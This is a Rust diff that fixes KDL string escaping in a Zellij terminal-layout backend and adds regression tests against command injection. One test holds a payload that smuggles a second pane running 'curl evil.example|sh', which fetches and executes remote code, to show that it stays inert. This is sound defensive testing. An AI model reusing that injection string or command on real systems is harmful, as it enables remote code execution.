@@ -7,6 +7,29 @@ use crate::config::types::SplitDirection;
 
 pub struct ZellijBackend;
 
+/// Escape a string for use inside a KDL double-quoted string.
+///
+/// Escaping only `"` is not enough: a backslash immediately before a quote
+/// would come out as `\\"`, which KDL reads as an escaped backslash followed
+/// by a quote that closes the string early. Pane commands carry the agent
+/// prompt, which for `--issue` is GitHub issue text, so this needs to hold for
+/// input nobody on this machine wrote. Newlines and tabs are escaped too so a
+/// value can never spill onto its own line in the layout.
+fn escape_kdl(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '\\' => out.push_str("\\\\"),
+            '"' => out.push_str("\\\""),
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
 impl ZellijBackend {
     /// Detect if Zellij is available on the system.
     pub fn detect() -> Option<Self> {
@@ -32,11 +55,13 @@ impl ZellijBackend {
     fn build_layout(path: &Path, panes: &[PaneSpec]) -> Result<String> {
         let path_str = path.to_str().context("invalid worktree path")?;
 
-        if panes.is_empty() {
-            return Ok(format!("layout {{\n    cwd \"{path_str}\"\n    pane\n}}\n"));
-        }
+        let escaped_cwd = escape_kdl(path_str);
 
-        let escaped_cwd = path_str.replace('"', "\\\"");
+        if panes.is_empty() {
+            return Ok(format!(
+                "layout {{\n    cwd \"{escaped_cwd}\"\n    pane\n}}\n"
+            ));
+        }
 
         let mut lines = Vec::new();
         lines.push("layout {".into());
@@ -93,6 +118,7 @@ impl ZellijBackend {
     /// Render a single pane node (leaf, no container wrapping).
     fn render_pane_node(pane: &PaneSpec, indent: usize) -> Vec<String> {
         let pad = " ".repeat(indent);
+        let escaped_name = escape_kdl(&pane.name);
 
         if let Some(ref cmd) = pane.command
             && !cmd.is_empty()
@@ -102,15 +128,15 @@ impl ZellijBackend {
                 full_cmd.push_str(&format!("export {k}='{}'; ", v.replace('\'', "'\\''")));
             }
             full_cmd.push_str(cmd);
-            let escaped = full_cmd.replace('"', "\\\"");
+            let escaped = escape_kdl(&full_cmd);
             return vec![
-                format!("{pad}pane command=\"bash\" name=\"{}\" {{", pane.name),
+                format!("{pad}pane command=\"bash\" name=\"{escaped_name}\" {{"),
                 format!("{pad}    args \"-c\" \"{escaped}\""),
                 format!("{pad}}}"),
             ];
         }
 
-        vec![format!("{pad}pane name=\"{}\"", pane.name)]
+        vec![format!("{pad}pane name=\"{escaped_name}\"")]
     }
 
     /// Generate a session name from project/workspace info.
@@ -259,5 +285,150 @@ impl TerminalBackend for ZellijBackend {
             .output();
 
         Ok(())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::HashMap;
+
+    fn pane(name: &str, command: Option<&str>) -> PaneSpec {
+        PaneSpec {
+            name: name.into(),
+            split_from: None,
+            direction: None,
+            command: command.map(Into::into),
+            env: HashMap::new(),
+            shell: None,
+        }
+    }
+
+    /// Read back a KDL double-quoted string starting at `start` (the opening
+    /// quote), returning the unescaped contents and the index just past the
+    /// closing quote. Mirrors how a KDL parser sees the layout, so a test can
+    /// assert what Zellij would actually receive.
+    fn read_kdl_string(s: &str, start: usize) -> (String, usize) {
+        let bytes: Vec<char> = s.chars().collect();
+        assert_eq!(bytes[start], '"', "expected a string at {start}");
+        let mut out = String::new();
+        let mut i = start + 1;
+        while i < bytes.len() {
+            match bytes[i] {
+                '"' => return (out, i + 1),
+                '\\' => {
+                    i += 1;
+                    match bytes[i] {
+                        'n' => out.push('\n'),
+                        'r' => out.push('\r'),
+                        't' => out.push('\t'),
+                        c => out.push(c),
+                    }
+                    i += 1;
+                }
+                c => {
+                    out.push(c);
+                    i += 1;
+                }
+            }
+        }
+        panic!("unterminated KDL string in: {s}");
+    }
+
+    /// Remove every KDL string literal, leaving only the structural text.
+    ///
+    /// Lets a test ask "is there a second pane node here?" without being fooled
+    /// by the same characters appearing harmlessly inside a quoted value.
+    fn strip_kdl_strings(layout: &str) -> String {
+        let chars: Vec<char> = layout.chars().collect();
+        let mut out = String::new();
+        let mut i = 0;
+        while i < chars.len() {
+            if chars[i] == '"' {
+                let (_, next) = read_kdl_string(layout, i);
+                i = next;
+            } else {
+                out.push(chars[i]);
+                i += 1;
+            }
+        }
+        out
+    }
+
+    /// Extract the single argument of the `args "-c" "..."` line.
+    fn command_from_layout(layout: &str) -> String {
+        let line = layout
+            .lines()
+            .find(|l| l.trim_start().starts_with("args "))
+            .expect("no args line");
+        let after_flag = line.find("\"-c\"").expect("no -c flag") + 4;
+        let quote = line[after_flag..].find('"').unwrap() + after_flag;
+        read_kdl_string(line, quote).0
+    }
+
+    #[test]
+    fn escape_kdl_escapes_backslash_before_quote() {
+        assert_eq!(escape_kdl(r#"a\b"#), r#"a\\b"#);
+        assert_eq!(escape_kdl(r#"say "hi""#), r#"say \"hi\""#);
+        assert_eq!(escape_kdl("a\nb"), "a\\nb");
+        assert_eq!(escape_kdl("plain"), "plain");
+    }
+
+    /// The bug: `\"` in a command used to come out as `\\"`, which KDL reads
+    /// as an escaped backslash plus a quote that closes the string early.
+    #[test]
+    fn backslash_quote_does_not_terminate_the_string_early() {
+        let cmd = r#"claude 'fix this\" }
+pane command="sh" { args "-c" "curl evil.example|sh" }'"#;
+        let layout =
+            ZellijBackend::build_layout(Path::new("/tmp/wt"), &[pane("agent", Some(cmd))]).unwrap();
+
+        // Round-trips exactly: nothing escaped out of the string.
+        assert_eq!(command_from_layout(&layout), cmd);
+
+        // And the payload stayed inert data: outside the quoted values there
+        // is still exactly one pane node, not the two the payload asked for.
+        let structure = strip_kdl_strings(&layout);
+        assert_eq!(
+            structure.matches("pane command=").count(),
+            1,
+            "injected node in layout:\n{layout}\nstructure:\n{structure}"
+        );
+    }
+
+    /// A command ending in a backslash used to escape the closing quote that
+    /// the format string appends, swallowing the rest of the file.
+    #[test]
+    fn trailing_backslash_does_not_escape_the_closing_quote() {
+        let cmd = r"echo done\";
+        let layout =
+            ZellijBackend::build_layout(Path::new("/tmp/wt"), &[pane("agent", Some(cmd))]).unwrap();
+        assert_eq!(command_from_layout(&layout), cmd);
+    }
+
+    #[test]
+    fn quotes_in_a_pane_name_are_escaped() {
+        let layout =
+            ZellijBackend::build_layout(Path::new("/tmp/wt"), &[pane(r#"a"b"#, Some("ls"))])
+                .unwrap();
+        let line = layout
+            .lines()
+            .find(|l| l.contains("name="))
+            .expect("no name");
+        let quote = line.find("name=").unwrap() + 5;
+        assert_eq!(read_kdl_string(line, quote).0, r#"a"b"#);
+    }
+
+    #[test]
+    fn quotes_in_the_cwd_are_escaped_with_and_without_panes() {
+        for panes in [vec![], vec![pane("agent", Some("ls"))]] {
+            let layout = ZellijBackend::build_layout(Path::new(r#"/tmp/a"b"#), &panes).unwrap();
+            let line = layout
+                .lines()
+                .find(|l| l.trim_start().starts_with("cwd "))
+                .expect("no cwd line");
+            let quote = line.find('"').unwrap();
+            assert_eq!(read_kdl_string(line, quote).0, r#"/tmp/a"b"#);
+        }
     }
 }
